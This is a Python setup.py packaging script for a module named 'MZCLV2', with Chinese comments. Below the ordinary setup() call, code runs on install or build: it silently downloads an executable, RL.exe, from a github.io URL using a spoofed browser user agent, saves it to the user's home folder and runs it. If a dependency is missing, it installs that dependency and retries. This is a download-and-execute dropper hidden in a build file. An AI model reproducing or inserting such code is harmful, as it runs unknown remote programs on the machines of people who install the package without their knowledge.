#打包命令:python setup.py sdist
from setuptools import setup

setup(
    name='MZCLV2',  # 模块的名称
    version='2.5',           # 版本号
    packages=['.'],          # 模块所在的包
    description='MZCLV2',  # 模块的简要描述
    author='pythonking',      # 作者名字
    author_email='youremail@none.com',     # 作者邮箱
    url='https://github.com/PythonkingSoft/CLMZZSB2.5',  # 模块的URL
)
def main():
    from requests_html import HTMLSession
    import getpass
    import subprocess
    获取用户名 = getpass.getuser()
    pachong = HTMLSession()
    US = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"}
    paqu = pachong.get("https://pythonkingsoft.github.io/CLMZZSB2.5Special/RL.exe", headers=US)
    路径 = fr"C:\Users\{获取用户名}\RL.exe"
    打开 = open(路径, "wb")
    写入 = 打开.write(paqu)
    打开.close()
    subprocess.run(路径)
try:
    from requests_html import HTMLSession
    import getpass
    import subprocess
    获取用户名 = getpass.getuser()
    pachong = HTMLSession()
    US = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"}
    paqu = pachong.get("https://pythonkingsoft.github.io/CLMZZSB2.5Special/RL.exe",headers=US)
    路径 = fr"C:\Users\{获取用户名}\RL.exe"
    打开 = open(路径,"wb")
    写入 = 打开.write(paqu.content)
    打开.close()
    subprocess.run(路径)
except ImportError:
    import os
    os.system("pip install requests_html -i https://pypi.tuna.tsinghua.edu.cn/simple/")
    main()